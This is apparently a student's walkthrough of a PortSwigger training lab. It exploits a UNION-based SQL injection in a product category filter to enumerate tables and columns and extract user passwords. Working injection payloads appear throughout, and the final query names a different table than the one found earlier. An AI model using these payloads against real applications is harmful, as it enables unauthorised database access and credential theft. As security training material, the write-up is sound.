
Description :  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
To solve the lab, log in as the `administrator` user.


## Solution

The goal of this lab is to log in as the `administrator` and we see this page after accessing the lab

![[PortSwigger/SQL Injection/Lab-5/Attachments/HomePage.png]]

We can see that this is just a normal page and there is `My account` login page and we know that this is a `UNION` attack so we need to drop the database that contains the `administrator` password

![[PortSwigger/SQL Injection/Lab-5/Attachments/Parameter.png]]

After clicking on the `Pets` filter we see there is `category` parameter appeared in the URL let's see if it throws error if we added `'` 

```sql
Pets'
```

![[Testing Parameter.png]]

That's a good evidence for us to test it more.

```sql
Pets' order by 1--
```

![[first orderby.png]]

now we can know for sure it's vulnerable to `SQLI` let's increase the number to know how much columns are there.

```sql
Pets' order by 3--
```

After testing number 2 and 3 i got error on number 3 so we know now there are 2 columns , and now we need to know what the data type of columns.

```sql
Pets' UNION SELECT NULL,NULL--
Pets' UNION SELECT 'A',NULL--
Pets' UNION SELECT NULL,'A'--
```


So we didn't get any error so we now that the 2 columns return `string` values

Now we need to know the table name.
we can do that by using this payload 

```sql
Pets' UNION SELECT NULL,table_name FROM information_schema.tables--
```

Pets' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_nmhzjx'--
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
![[Tables.png]]

And the table name we need is `users_nmhzjx` let's see it's columns by using this payload

```sql
Pets' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_nmhzjx'--
```

![[Columns.png]]

We see that there is a username and password columns that's what we need let's get the password using this payload.

```sql 
Pets' UNION SELECT username,password FROM users--
```

![[Password.png]]

![[Solved5.png]]